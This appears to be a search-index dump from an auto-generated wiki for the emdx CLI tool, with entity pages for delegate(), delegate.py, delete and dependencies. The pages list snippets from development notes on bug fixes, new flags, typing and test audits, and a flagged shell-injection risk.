<li><code>near_duplicate_threshold</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/delegate/","title":"delegate()","text":"<p>Type: tech_term | Mentioned in: 20 documents | First seen: 2026-02-14</p>"},{"location":"entities/delegate/#documents-20","title":"Documents (20)","text":"<ul> <li>#6839 Delegate: list   Section: 1. <code>emdx/commands/delegate.py</code> \u2014 Subcommand routing fix <p>Fix: </p> </li> <li>Added <code>import click</code></li> <li>Added a routing block at the top of the <code>delegate()</code> callback that checks if <code>tasks[0]</code> matches a registered subcommand name, and if so, manually invokes it via click's context machinery</li> <li> <p>Removed the <code>help=</code> paramete...</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <p>...mmands/delegate.py<code>** (lines 1203-1215): Added subcommand detection at the top of</code>delegate()<code>. If</code>tasks[0]<code>matches a registered subcommand name (via</code>ctx.command.get_command()`), it constructs a proper Click context and invokes the subcommand instead of tr...</p> </li> <li> <p>#6835 Delegate: list   Section: Summary</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> <p>...tructor (the docstring handles it)</p> </li> <li> <p>Added subcommand detection at the top of <code>delegate()</code>: when the first positional arg matches a registered subcommand name, it re-invokes through Click's <code>get_command()</code> machinery instead of treating it as a task prompt</p> </li> <li> <p>#6830 Delegate: --help [2/2]</p> <p><code>emdx/commands/delegate.py</code>:</p> </li> <li>Removed <code>help=</code> from <code>typer.Typer()</code> \u2014 the <code>delegate()</code> function's docstring now serves as the help text, giving the rich description with all examples</li> <li>Added <code>import click</code></li> <li> <p>Added subcommand routing logic: when `inv...</p> </li> <li> <p>#6828 Delegate: --help [2/2]</p> <p>...<code>\"Delegate tasks to agents (stdout-friendly)\"</code> was outdated. The docstring on the <code>delegate()</code> callback now serves as the sole help text, and it's much more comprehensive with examples.</p> </li> <li> <p>#6692 FEAT-12: Add --retry flag to delegate   Section: Changes (3 files, +443/-26 lines):</p> <p>...py`** \u2014 Core implementation:</p> </li> <li>Added <code>--retry N</code> / <code>-r N</code> flag (default 0) to the <code>delegate()</code> command</li> <li>Added retry constants: <code>RETRY_BACKOFF_BASE=2s</code>, <code>RETRY_BACKOFF_MAX=60s</code>, <code>RETRY_JITTER_MAX=1s</code></li> <li> <p>Added <code>_is_retryable_failure()</code> \u2014 detects transient failu...</p> </li> <li> <p>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made</p> <p>...and output parsing)</p> </li> <li>Removed <code>--each</code> and <code>--do</code> CLI option parameters from the <code>delegate()</code> function</li> <li>Removed <code>--each</code>/<code>--do</code> from the <code>known_flags</code> set (flag misuse guard)</li> <li> <p>Removed the dynamic discovery block that ran <code>_run_discovery()</code> and expanded tem...</p> </li> <li> <p>#6565 Delegate: Look at the synthesis_service.py \u2014 how does --synthesize wor [3/3]   Section: Flow Summary</p> <p>...User: emdx delegate --synthesize \"task1\" \"task2\" \"task3\"          \u2502          \u25bc     delegate() CLI callback          \u2502          \u25bc     _run_parallel() (since len(tasks) &gt; 1)          \u2502          \u251c\u2500\u2500 [Parallel] Execute each task via _run_single()          \u2502...</p> </li> <li> <p>#6543 Delegate Enhancement Gameplans [2/5]   Section: 1. CLI Flag Definition</p> <p>Add the <code>--retry</code> flag in the <code>delegate()</code> function signature:</p> </li> <li> <p>#6541 Delegate Enhancement Gameplans [3/5]   Section: 2. Add CLI Option</p> <p>Location: <code>emdx/commands/delegate.py</code> line ~965 (in the <code>delegate()</code> callback)</p> </li> <li> <p>#6513 Fix Typer type mismatches and dead code   Section: 1. emdx/commands/delegate.py (5 fixes)</p> <p>Fixed type annotations for parameters in the <code>delegate()</code> function:</p> </li> <li> <p>#6483 Delegate: Kink 5: Unify delegate branch naming in emdx/commands/delega [2/3]   Section: 3. Updated Branch Creation Points in <code>emdx/commands/delegate.py</code></p> <p>...e_delegate_branch_name()<code>for each task instead of</code>{prefix}/{slug}-{n}`</p> </li> <li> <p>Main <code>delegate()</code> function: Passes task title to <code>create_worktree()</code> and uses the returned branch name</p> </li> <li> <p>#6443 Delegate: Fix orphan worktrees when using --pr flag   Section: Changes Made</p> </li> </ul> <pre><code>if worktree_path and not pr:\n    cleanup_worktree(worktree_path)\n</code></pre> <ul> <li>#6425 Delegate: Task #594: Add --draft flag to emdx delegate --pr   Section: Changes Made <ol> <li>emdx/commands/delegate.py:</li> </ol> </li> <li>Added <code>--draft/--no-draft</code> CLI option to <code>delegate()</code> function (default: True)</li> <li>Updated <code>_make_pr_instruction()</code> to accept <code>draft</code> parameter and include <code>--draft</code> flag in PR instructions when <code>draft=True</code></li> <li> <p>Upda...</p> </li> <li> <p>#6365 Gameplan: emdx delegate --draft-pr mode   Section: Task 2: Validate <code>--draft</code> requires <code>--pr</code></p> <p>Add validation in the <code>delegate()</code> function (around line 703, after existing validations):</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 2. Overly Long Functions</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> <p>...logic from unified_executor | | 69.3 | 198 | 4 | <code>commands/delegate.py:521</code> | <code>delegate()</code> | Many flags and execution modes | | 67.6 | 151 | 4 | <code>commands/maintain.py:645</code> | <code>_cleanup_processes()</code> | Process health checking with multiple conditions | |...</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 2. UNTESTED PUBLIC FUNCTIONS IN EXISTING MODULES</p> <p>...| | <code>_run_chain()</code> | \ud83d\udd34 CRITICAL | Test chained execution with output passing | | <code>delegate()</code> | \ud83d\udd34 CRITICAL | Integration test for all flag combinations |</p> </li> <li> <p>#6320 Delegate: Add comprehensive test coverage for the delegate command (em   Section: Test Coverage</p> </li> <li>delegate(): 15 tests covering:</li> <li>Single task invocation</li> <li>Multiple tasks \u2192 parallel execution</li> <li>--chain flag triggering sequential execution</li> <li>--chain and --synthesiz...</li> </ul>"},{"location":"entities/delegate/#root-cause","title":"Root Cause","text":"<p>The subcommand routing code in the <code>delegate()</code> callback used <code>isinstance(ctx.command, click.MultiCommand)</code> but <code>click</code> was not imported. This caused <code>emdx delegate list</code> to fail with a <code>NameError</code>, and instead o...</p>"},{"location":"entities/delegate/#2-delegate-finally-block-lines-998-1006","title":"2. <code>delegate()</code> finally block (lines 998-1006)","text":"<p>Changed from:</p>"},{"location":"entities/delegate/#23-delegate-callback-in-delegatepy-medium-140-lines-581-780","title":"2.3 <code>delegate()</code> callback in delegate.py (MEDIUM - 140 lines, 581-780)","text":"<p>Complex routing logic for different execution modes.</p>"},{"location":"entities/delegate/#main-command-entry-point","title":"Main Command Entry Point","text":""},{"location":"entities/delegate/#related-entities","title":"Related Entities","text":"<ul> <li><code>summary add</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>emdx delegate stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>help=</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=4.8)</li> <li><code>emdx delegate list</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.8)</li> <li><code>tasks[0]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>pr_instruction</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>integration test</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>import click</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>emdx/commands/delegate.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>invoke_without_command=true</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.6)</li> </ul>"},{"location":"entities/delegatepy/","title":"delegate.py","text":"<p>Type: heading | Mentioned in: 34 documents | First seen: 2026-02-13</p>"},{"location":"entities/delegatepy/#documents-34","title":"Documents (34)","text":"<ul> <li> <p>#6495 None Type Analysis [1/7]   Section: Summary</p> File Unnecessary <code>| None</code> Legitimate <code>| None</code> Total Analyzed delegate.py 1 14 15 core.py 1 6 7 </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Summary</p> <p>...No (local list comp) | | review.py | 1 | 0 | No (Any is appropriate for JSON) | | delegate.py | 3 | 0 | No (**kwargs pattern) |</p> </li> <li> <p>#6835 Delegate: list   Section: Summary</p> <p>Bug found and already fixed on disk: <code>emdx delegate list</code> (and all other delegate subcommands) was broken due to a <code>NameError: name 'click' is not defined</code> on line 1208 of <code>delegate.py</code>.</p> </li> <li> <p>#6786 Delegate: --help [2/2]</p> <ul> <li><code>delegate.py</code>: Replaced the verbose function docstring with a concise <code>_DELEGATE_HELP</code> constant using Rich markup (<code>[bold]</code>, <code>[dim]</code>), enabled <code>rich_markup_mode=\"rich\"</code> on the...</li> </ul> </li> <li> <p>#6728 Wiki Generation Architecture Research [6/10]   Section: Recommendation: Three-Tier Scoring with Noise Filtering</p> <p>...-------| | CLEAN | 532 | <code>command injection</code>, <code>emdx delegate</code> | | PY_FILE | 173 | <code>delegate.py</code>, <code>tasks.py</code> | | FILE_PATH | 115 | <code>emdx/commands/delegate.py</code> | | FUNC_CALL | 53 | <code>_run_discovery()</code>, <code>shlex.split()</code> | | CLI_FLAG | 27 | <code>--each</code>, <code>--json</code> | | SU...</p> </li> <li> <p>#6678 Delegate Slimming Research [1/3]</p> <p>Here is the comprehensive catalog of everything <code>delegate.py</code> does, classified by movability:</p> </li> <li> <p>#6575 Delegate: Add a one-line comment above _print_doc_content in delegate.   Section: Delegate: Add Comment Above _print_doc_content</p> </li> <li> <p>#6574 Delegate synthesis [synthesis]   Section: Key Findings</p> File Role Lines <code>core.py</code> Foundation CRUD (save, find, view, edit, delete) 1,227 <code>delegate.py</code> AI orchestration &amp; parallel task execution 1,180 <code>tasks.py</code> Work queue &amp; dependency management 462 </li> <li> <p>#6573 Delegate: List the 3 most important files in emdx/commands/ and say on [1/2]   Section: 3 Most Important Files in emdx/commands/</p> </li> <li> <p>#6571 Delegate synthesis [synthesis]   Section: Minor Issues Found</p> <ol> <li>Dead code: Unreachable duplicate <code>return doc_ids</code> at line 861 of <code>delegate.py</code></li> </ol> </li> <li> <p>Theoretical edge case: Agent could save with unrecognized doc ID format, triggering fallback duplicate (unlikely with current comprehensive patterns)</p> </li> <li> <p>#6570 Delegate: Analyze the output capture and auto-save fallback in emdx/co [1/3]   Section: Executive Summary</p> <p>This document traces the exact flow of output capture in <code>emdx/commands/delegate.py</code> and analyzes when the auto-save fallback triggers. Critically, I've identified a potential duplicate content scenario where the fallback could produce duplicate...</p> </li> <li> <p>#6567 Delegate synthesis [synthesis]   Section: 1. Architecture Overview</p> ...yer Component Responsibility CLI <code>delegate.py</code> Flag parsing, orchestration, synthesis Execution <code>UnifiedExecutor</code> Claude CLI invocation, streaming, metrics Isolation Git worktrees Per-task clea... </li> <li> <p>#6566 Delegate: Review the UnifiedExecutor in emdx/services/unified_executor [2/3]   Section: ThreadPoolExecutor Model</p> <p>Parallel execution is managed in <code>delegate.py</code> via Python's <code>concurrent.futures.ThreadPoolExecutor</code>:</p> </li> <li> <p>#6549 Delegate: Review PR #654 using 'gh pr view 654' and 'gh pr diff 654'.  [2/6]   Section: Changes Reviewed</p> File Changes <code>delegate.py</code> Added <code>timeout</code> parameter to <code>_run_single()</code> <code>recipe.py</code> Added structured recipe support, <code>show</code> and <code>install</code> commands <code>recipe_executor.py</code> New step-... </li> <li> <p>#6541 Delegate Enhancement Gameplans [3/5]   Section: 1. New Function: <code>_get_memory_context()</code></p> <p>Location: <code>emdx/commands/delegate.py</code> (add after line ~405, near <code>_load_doc_context()</code>)</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Details</p> </li> <li>Added <code>--draft/--no-draft</code> CLI option (default: False for consistency)</li> <li>Created <code>_make_pr_instruction(draft: bool)</code> function</li> <li> <p>Updated <code>_run_single()</code>, `run...</p> </li> <li> <p>#6475 Dead Code and Error Handling Audit: emdx Project   Section: Silent Failures Hiding Bugs</p> <p>High Priority (Database/Core Operations):</p> </li> <li><code>emdx/commands/delegate.py:64-65</code> - Task update failures silently ignored</li> <li><code>emdx/commands/delegate.py:75-76</code> - Execution update failures silently ignored  </li> <li> <p><code>emdx/commands/status.py:216-218</code>...</p> </li> <li> <p>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: 1. emdx/commands/ (11 files audited)</p> <p>Skip:</p> </li> <li><code>delegate.py</code>: <code>**kwargs: Any</code> pattern is appropriate for forwarding</li> <li> <p><code>review._output_json()</code>: Generic JSON output needs <code>Any</code></p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 2. Overly Long Functions</p> </li> <li> <p>#6315 Delegate: Analyze CODE COMMENTS &amp; DOCUMENTATION across emdx/ (exclude  [2/15]   Section: \u2705 STRENGTHS</p> <p>...utor.py`: Explains stream-json default, module purpose, dependency architecture</p> </li> <li><code>delegate.py</code>: Comprehensive usage examples in module docstring</li> <li> <p><code>constants.py</code>: Well-organized with section headers (<code># =====</code>) for groupability</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>Lazy (heavy, loaded on demand):</p> </li> <li><code>delegate.py</code>: one-shot AI execution (parallel, chain, worktree, PR)</li> <li><code>cascade.py</code>: idea-to-code pipeline with stages</li> <li><code>recipe.py</code>: reusable recipe management</li> <li> <p><code>ask.py</code>: AI Q&amp;A over knowledge base</p> </li> <li> <p>#6307 Delegate: Analyze ERROR HANDLING PATTERNS across emdx/ (exclude ui/ an [6/15]   Section: \u26a0\ufe0f Areas for Improvement</p> </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: 2. Clarified Tag Input Format</p> <p>Updated <code>delegate.py</code> help text for <code>--tags</code> option:</p> </li> <li>Before: \"Tags to apply to outputs (comma-separated)\"</li> <li> <p>After: \"Tags to apply to outputs (comma-separated or multiple -t flags)\"</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: CRITICAL SEVERITY (Breaking Contract Risks)</p> </li> <li> <p>#6218 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: 4. Inconsistent Error Output Formats</p> <p>...e | |---------|-------------| | <code>core.py</code> | <code>[red]Error: {e}[/red]</code> with rich | | <code>delegate.py</code> | <code>sys.stderr.write(f\"delegate: ...\")</code> plain text | | <code>cascade.py</code> | <code>console.print(f\"[red]Error: ...\")</code> rich | | <code>prime.py</code> | Mix of print() and console.print() |</p> </li> <li> <p>#6183 Delegate: analysis,audit [13/17]   Section: \ud83d\udd34 Critical</p> <ol> <li>Shell Injection Risk</li> </ol> </li> <li><code>delegate.py:134</code> uses <code>shell=True</code> with subprocess</li> <li>Potential command injection if user input reaches this path</li> <li> <p>Review the input sanitization</p> </li> <li> <p>#6162 Delegate: Audit test coverage. Check: (1) is there a test file for emd [8/17]   Section: (5) Which command modules have NO test file at all?</p> <p>...tadata.py<code>tests DB, not CLI) | |</code>core.py<code>| \u2705 YES (</code>test_commands_core.py<code>) | |</code>delegate.py<code>| \u274c NO | |</code>executions.py<code>| \u26a0\ufe0f PARTIAL (</code>test_execution_system*.py<code>tests models, not CLI) | |</code>gdoc.py<code>| \u274c NO | |</code>gist.py<code>| \u274c NO | |</code>groups.py<code>| \u2705 YES (</code>test...</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: Key Findings</p> <p>...acy | |--------|----------------|-----------|-------------|----------| | Commands (delegate.py, core.py) | 50+ | 45+ | 5 bugs | 90% | | Commands (other) | 46 | 46 | 0 | 100% | | Database | 45+ | 45+ | 0 | 100% | | Models | 38 | 38 | 0 | 100% | | Services (exec...</p> </li> <li> <p>#6504 Any Type Removal Analysis [5/5]   Section: Summary</p> <p>...nt | Removable | Notes | |------|-----------|-----------|-------| | <code>emdx/commands/delegate.py</code> | 3 | 3 | All are <code>**kwargs</code> wrappers | | <code>emdx/commands/compact.py</code> | 7 | 5 | Similarity matrix is tricky | | <code>emdx/commands/distill.py</code> | 5 | 4 | Audience enum re...</p> </li> <li> <p>#6456 Delegate: List the 3 most important Python files in the emdx/commands/   Section: 3 Most Important Python Files in emdx/commands/</p> <ol> <li>delegate.py \u2014 Handles task delegation to Claude agents with parallel execution, synthesis, chaining, and PR creation workflows.</li> </ol> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>..., Actively Used) | Command | LOC | Assessment | |---------|-----|------------| | delegate.py | 819 | CRITICAL - The star of the show. Implements single/parallel/chain execution, worktree isolation, PR creation, discovery mode. Well-designed, heavily us...</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> </li> <li>delegate.py: Task/execution update failures now logged to stderr with task/execution IDs</li> <li> <p>status.py: Added module logger, cascade status errors logged at debug level -...</p> </li> <li> <p>#6221 Delegate: Audit SECURITY DEBT in the emdx project: Check for SQL injec [5/14]   Section: 1. COMMAND INJECTION - HIGH SEVERITY</p> <p>Location: <code>emdx/commands/delegate.py:141-166</code> ```python def _run_discovery(command: str) -&gt; List[str]:     result = subprocess.run(         command,         shell=True,  # &lt;-- shell=True with user-contr...</p> </li> <li> <p>#6169 Delegate: Analyze the task runner service. Read emdx/services/task_run [3/15]   Section: Different Execution Paths:</p> <ol> <li>delegate.py \u2192 <code>unified_executor.UnifiedExecutor.execute()</code></li> </ol> </li> <li>Waits for completion</li> <li>Streams output, captures result</li> <li>Returns structured <code>ExecutionResult</code> with tokens, cost, content</li> </ul>"},{"location":"entities/delegatepy/#task","title":"Task","text":"<p>Add a one-line comment above <code>_print_doc_content</code> in <code>delegate.py</code> explaining that <code>_run_single</code> already handles printing.</p>"},{"location":"entities/delegatepy/#2-delegatepy-1180-lines","title":"2. <code>delegate.py</code> (1,180 lines)","text":"<p>The AI orchestration engine \u2014 handles spawning Claude agents for parallel task execution, worktree isolation, PR creation, and result persistence, which is the primary way Claude Code users interact with emdx.</p>"},{"location":"entities/delegatepy/#changes-to-delegatepy","title":"Changes to <code>delegate.py</code>","text":""},{"location":"entities/delegatepy/#23-delegate-callback-in-delegatepy-medium-140-lines-581-780","title":"2.3 <code>delegate()</code> callback in delegate.py (MEDIUM - 140 lines, 581-780)","text":"<p>Complex routing logic for different execution modes.</p>"},{"location":"entities/delegatepy/#1-silent-failures-in-delegatepy-lines-64-65-75-76","title":"1. Silent Failures in delegate.py (Lines 64-65, 75-76)","text":"<p>```python def _safe_update_task(task_id: Optional[int], **kwargs) -&gt; None:     \"\"\"Update task, never fail delegate.\"\"\"     try:         from ....</p>"},{"location":"entities/delegatepy/#2-silent-failures-in-delegatepy","title":"2. Silent Failures in delegate.py","text":"<p>Location: <code>delegate.py:_safe_create_task()</code>, <code>_safe_update_task()</code>, <code>_safe_update_execution()</code> Issue: These functions swallow exceptions silently: ```python...</p>"},{"location":"entities/delegatepy/#commands-4-files","title":"Commands (4 files)","text":""},{"location":"entities/delegatepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.3)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.2)</li> <li><code>recipe.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.9)</li> <li><code>silent failures</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=3.9)</li> <li><code>prime.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=3.7)</li> <li><code>browse.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=3.6)</li> <li><code>status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=3.6)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=3.6)</li> <li><code>analyze.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=3.6)</li> <li><code>core.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=3.6)</li> </ul>"},{"location":"entities/delete/","title":"delete","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2025-07-07</p>"},{"location":"entities/delete/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6687 Fix emdx delete auto-confirm for non-TTY   Section: Summary</p> <p>All changes are committed on branch <code>delegate/fix-emdx-delete-auto-confirm-for-non-tty-2efe8</code>. Here's what was done:</p> </li> <li> <p>#6385 Delegate: Analyze EMDX's actual usage patterns to determine what's rea [2/4]   Section: 1. Commands Analysis by LOC and Value</p> <p>...y used. | | core.py | 875 | ESSENTIAL - CRUD operations (save, view, edit, delete, find, list, recent). Bread and butter of the knowledge base. | | tasks.py | 389 | VALUABLE - Work queue for Claude sessions. Simple, focused, integrates wel...</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Files Requiring Major Refactoring</p> <p>...ing | | <code>commands/core.py</code> | 306.2 | 4 complex functions (<code>find</code>, <code>save</code>, <code>edit</code>, <code>delete</code>) | | <code>utils/claude_wrapper.py</code> | 116.7 | Single god function doing everything |</p> </li> <li> <p>#6264 Delegate: API/Interface Debt Fix - Help Text and Silent Failures   Section: Summary</p> <p>...lly well-designed - commands that accept either ID or title (like <code>view</code>, <code>edit</code>, <code>delete</code>) intentionally use <code>str</code> or <code>Union[str, int]</code> to support both lookup methods. This is documented behavior and NOT an inconsistency.</p> </li> <li> <p>#6236 Delegate: Audit TESTING DEBT in the emdx project: Find untested public [10/14]   Section: 1. MODULES WITH 0% TEST COVERAGE (CRITICAL)</p> <p>...asks.py<code>| \ud83d\udd34 CRITICAL | 5 public functions | Test</code>add<code>,</code>ready<code>,</code>done<code>,</code>list<code>,</code>delete` |</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> </li> <li> <p><code>task_id</code> (required): Task ID</p> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]   Section: File-by-File Analysis</p> <p>...ywhere in codebase</p> </li> <li>Location: <code>emdx/utils/cli.py:13-39</code></li> <li> <p>Recommendation: DELETE entire file (40 lines)</p> </li> <li> <p>#186 EMAIL-MANAGEMENT-GUIDES   Section: Tools and Shortcuts</p> <p>Gmail keyboard shortcuts:</p> </li> <li><code>/</code> - Focus search box</li> <li><code>g + i</code> - Go to inbox</li> <li><code>g + a</code> - Go to all mail</li> <li><code>x</code> - Select conversation</li> <li><code>e</code> - Archive</li> <li><code>#</code> - Delete</li> </ul>"},{"location":"entities/delete/#8-delete-delete-a-task","title":"8. <code>delete</code> \u2014 Delete a task","text":"<p>Arguments:</p>"},{"location":"entities/delete/#related-entities","title":"Related Entities","text":"<ul> <li><code>services</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>parse_timestamp</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>format_datetime</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>commands analysis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>parse_datetime</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>commands/tasks.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>update</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>format_stream_line()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>create</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>ready</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/dependencies/","title":"dependencies","text":"<p>Type: heading | Mentioned in: 14 documents | First seen: 2025-07-07</p>"},{"location":"entities/dependencies/#documents-14","title":"Documents (14)","text":"<ul> <li>#6723 Wiki Generation Architecture Research \u2014 Topic Clustering Algorithms   Section: Leiden Algorithm (RECOMMENDED) <p>..., resolution parameter for granularity</p> </li> <li>Cons: Requires <code>leidenalg</code> + <code>igraph</code> dependencies (~15MB)</li> <li>Python: <code>leidenalg.find_partition(G, la.ModularityVertexPartition)</code> or <code>la.CPMVertexPartition</code> with resolution param</li> <li> <p>Granularity: Resolution para...</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: Dependencies</p> <ul> <li><code>normalize_tag_to_emoji</code> from <code>emdx/utils/emoji_aliases.py</code> \u2014 already exists</li> </ul> </li> <li><code>document_tags</code> and <code>tags</code> tables \u2014 already exist in schema</li> <li> <p>No new dependencies required</p> </li> <li> <p>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Checklist</p> </li> <li>[x] Create <code>SynthesisService</code> class</li> <li>[x] Implement document loading and synthesis</li> <li>[x] Add cost estimation functionality</li> <li> <p>[x] Handle import guards for optional dependencies</p> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]</p> <p>Cost transparency \u2014 compact reports tokens/cost; --dry-run is free</p> </li> <li>Reusability \u2014 SynthesisService designed for future <code>distill</code> command</li> </ul>"},{"location":"entities/dependencies/#phase-2-synthesis-service","title":"Phase 2: Synthesis Service \u2713","text":""},{"location":"entities/dependencies/#implementation-priority","title":"Implementation Priority","text":""},{"location":"entities/dependencies/#quick-win-this-session","title":"Quick Win (This Session)","text":"<ul> <li>[ ] <code>--draft</code> flag implementation</li> </ul>"},{"location":"entities/dependencies/#_1","title":"...","text":"<ul> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Task 2.1: Create <code>SynthesisService</code></p> <p>Dependencies: <code>anthropic</code> (optional, from <code>[ai]</code> extra)</p> </li> <li> <p>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing   Section: Implementation Tasks</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: High Priority Findings</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Core Components</p> <p>...\u2502 \u2502  \u2502 - CRUD ops       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502 - create, list, show \u2502           \u2502 \u2502  \u2502 - dependencies   \u2502        \u2502 - update, log, delete\u2502           \u2502 \u2502  \u2502 - status mgmt    \u2502        \u2502 - run, manual, retry \u2502           \u2502 \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        